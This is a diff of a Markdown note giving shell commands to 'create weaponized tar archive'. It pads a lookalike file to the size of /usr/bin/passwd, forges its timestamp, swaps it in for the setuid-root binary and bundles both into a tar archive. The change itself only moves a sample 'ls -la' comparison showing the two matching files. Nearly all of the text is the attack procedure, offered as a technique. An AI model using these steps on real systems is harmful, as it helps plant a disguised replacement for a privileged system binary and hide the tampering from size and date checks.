@@ -6,12 +6,6 @@ DIFF=$((OSIZE-SSIZE))
 sudo truncate -s +$DIFF ./passwd
 ls -la ./passwd && ls -la /usr/bin/passwd
 ```
-## example output of comparison
-```
-$ ls -la /usr/bin/passwd /usr/bin/chpwd
--rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/chpwd
--rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/passwd
-```
 # create weaponized tar archive
 ```
 sudo mv /usr/bin/passwd /usr/bin/chpwd
@@ -25,4 +19,11 @@ sudo touch -d "$(date -R -r /usr/bin/chpwd)" /usr/bin/passwd
 sudo tar -cvf myfiles.tar /usr/bin/passwd /usr/bin/chpwd
 sudo rm /usr/bin/passwd
 sudo mv /usr/bin/chpwd /usr/bin/passwd
+```
+
+## example output of comparison
+```
+$ ls -la /usr/bin/passwd /usr/bin/chpwd
+-rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/chpwd
+-rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/passwd
 ```
